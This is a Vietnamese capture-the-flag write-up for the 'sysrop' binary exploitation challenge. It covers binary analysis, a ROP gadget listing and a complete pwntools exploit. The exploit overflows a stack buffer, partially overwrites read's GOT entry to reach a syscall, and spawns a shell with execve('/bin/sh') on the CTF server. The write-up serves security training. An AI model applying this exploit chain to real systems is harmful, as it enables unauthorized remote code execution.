# Challenge
Khảo sát challenge này trên linux
```sh
zir@HAZIR:~/HackCTF$ file sysrop
sysrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=194fc93a0eb283750cbd161d675faaeb4443ca90, stripped
```
File này dynamically linked, 64-bit, stripped.

Xem pseudo code của chương trình, dùng IDA 7.5
```sh
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  read(0, buf, 0x78uLL);
  return 0LL;
}
```
Chương trình sẽ chỉ có 1 hàm là read().

Dùng gdb-pwndbg để checksec file binary
```sh
pwndbg> checksec
[*] '/home/zir/HackCTF/sysrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
No PIE, No Canary sẽ rất có ít cho challenge này.

```sh
pwndbg> disass read
Dump of assembler code for function read:
   0x00000000000f7250 <+0>:	cmp    DWORD PTR [rip+0x2d24e9],0x0        # 0x3c9740
   0x00000000000f7257 <+7>:	jne    0xf7269 <read+25>
   0x00000000000f7259 <+9>:	mov    eax,0x0
   0x00000000000f725e <+14>:	syscall 
   0x00000000000f7260 <+16>:	cmp    rax,0xfffffffffffff001
   0x00000000000f7266 <+22>:	jae    0xf7299 <read+73>

```

Trong hàm read có dùng 1 lệnh syscall, mình sẽ dùng lệnh syscal này với tham số truyền vào phù hợp để spawnshell.

Chúng ta sẽ cần tìm 1 số gadget.
```py
zir@HAZIR:~/HackCTF$ ROPgadget --binary sysrop | grep "pop"
0x000000000040054c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040054e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004005e9 : in eax, 0x58 ; pop rdx ; pop rdi ; pop rsi ; ret
0x000000000040053d : je 0x400550 ; pop rbp ; mov edi, 0x601040 ; jmp rax
0x000000000040058b : je 0x400598 ; pop rbp ; mov edi, 0x601040 ; jmp rax
0x00000000004005e8 : mov ebp, esp ; pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
0x00000000004005e7 : mov rbp, rsp ; pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
0x00000000004005ef : nop ; pop rbp ; ret
0x0000000000400548 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400595 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004006bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006c0 : pop r14 ; pop r15 ; ret
0x00000000004006c2 : pop r15 ; ret
'0x00000000004005ea : pop rax ; pop rdx ; pop rdi ; pop rsi ; ret'
0x00000000004005e0 : pop rbp ; jmp 0x400560
0x00000000004005b2 : pop rbp ; mov byte ptr [rip + 0x200a9e], 1 ; ret
0x000000000040053f : pop rbp ; mov edi, 0x601040 ; jmp rax
0x00000000004006bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004005ec : pop rdi ; pop rsi ; ret
0x00000000004006c3 : pop rdi ; ret
0x0000000000400291 : pop rdi ; stosb byte ptr [rdi], al ; jmp 0x4002d9
'0x00000000004005eb : pop rdx ; pop rdi ; pop rsi ; ret'
0x00000000004006c1 : pop rsi ; pop r15 ; ret
0x00000000004005ed : pop rsi ; ret

```
2 gadget này sẽ giúp mình truyền các tham số cần để spawnshell.

Với syscall để gọi shell thì:
* rax = 59 (0x3b)
* rdi = addr_binsh
* rsi = 0
* rdx = 0

# Exploit 
Code exploit bên dưới có sử dụng sleep(0.1) để ngăn cách các lần nhập với nhau, vì chương trình không in ra 1 đoạn text này sau khi nhập trong hàm main, nên mình dùng sleep() ngăn không cho các string nối với nhau khi debug bằng gdb hoặc khi chạy file exploit.

```py
from pwn import *
#s = process("./sysrop")
s = remote("ctf.j0n9hyun.xyz", 3024)
pause()

bss_addr = 0x601100
pop_rdx_rdi_rsi_ret = 0x00000000004005eb
pop_rax_rdx_rdi_rsi_ret = 0x00000000004005ea
read_plt = 0x4004b0
read_got = 0x601018
binsh = "/bin/sh\x00"
main = 0x0000000004005F2

syscal_offset = '\x4f' #so voi read local
syscal_offset = '\x5e' #so voi read server

# Read "/bin/sh" --> bss segment
payload = ''
payload += "a"*0x18
payload += p64(pop_rdx_rdi_rsi_ret)
payload += p64(len(binsh))
payload += p64(0)
payload += p64(bss_addr)
payload += p64(read_plt)
payload += p64(main)

# Convert Read --> syscall 
payload1 = ''
payload1 += "a"*0x18 
payload1 += p64(pop_rdx_rdi_rsi_ret)
payload1 += p64(1)
payload1 += p64(0)
payload1 += p64(read_got)
payload1 += p64(read_plt)

# SpawnShell
payload1 += p64(pop_rax_rdx_rdi_rsi_ret)
payload1 += p64(59)
payload1 += p64(0)
payload1 += p64(bss_addr)
payload1 += p64(0)
payload1 += p64(read_plt)

s.sendline(payload)
sleep(0.1)
s.send('/bin/sh')
sleep(0.1)
s.sendline(payload1)
sleep(0.1)
s.sendline(syscal_offset)


s.interactive()
```
